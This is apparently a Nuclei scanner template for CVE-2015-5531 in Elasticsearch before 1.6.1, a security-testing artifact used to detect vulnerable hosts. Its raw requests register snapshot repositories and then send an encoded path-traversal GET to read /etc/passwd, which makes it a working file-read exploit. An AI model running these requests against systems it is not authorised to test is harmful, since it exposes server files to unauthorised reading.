http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - ElasticsearchParseException
    - Failed to derive xcontent from
    - 114, 111, 111, 116, 58
  - status:
    - 400
    type: status
  matchers-condition: and
  raw:
  - "PUT /_snapshot/test HTTP/1.1\nHost: {{Hostname}}\n\n{\n    \"type\": \"fs\",\n\
    \    \"settings\": {\n        \"location\": \"/usr/share/elasticsearch/repo/test\"\
    \n    }\n}\n"
  - "PUT /_snapshot/test2 HTTP/1.1\nHost: {{Hostname}}\n\n{\n    \"type\": \"fs\"\
    ,\n    \"settings\": {\n        \"location\": \"/usr/share/elasticsearch/repo/test/snapshot-backdata\"\
    \n    }\n}\n"
  - 'GET /_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd  HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2015-5531
info:
  author: princechaddha
  classification:
    cpe: cpe:2.3:a:elasticsearch:elasticsearch:*:*:*:*:*:*:*:*
    cve-id: CVE-2015-5531
    cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N
    cvss-score: 5
    cwe-id: CWE-22
    epss-percentile: 0.99653
    epss-score: 0.91581
  description: ElasticSearch before 1.6.1 allows remote attackers to read arbitrary
    files via unspecified vectors related to snapshot API calls.
  impact: 'Successful exploitation of this vulnerability allows an attacker to read
    arbitrary files on the server, potentially leading to unauthorized access or sensitive
    information disclosure.

    '
  metadata:
    fofa-query: index_not_found_exception
    max-request: 3
    product: elasticsearch
    vendor: elasticsearch
  name: ElasticSearch <1.6.1 - Local File Inclusion
  reference:
  - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531
  - https://nvd.nist.gov/vuln/detail/CVE-2015-5531
  - http://packetstormsecurity.com/files/132721/Elasticsearch-Directory-Traversal.html
  - https://www.elastic.co/community/security/
  - http://packetstormsecurity.com/files/133797/ElasticSearch-Path-Traversal-Arbitrary-File-Download.html
  remediation: 'Upgrade ElasticSearch to version 1.6.1 or later to mitigate the vulnerability.

    '
  severity: medium
  tags: cve2015,cve,vulhub,packetstorm,elasticsearch,intrusive,vkev,vuln
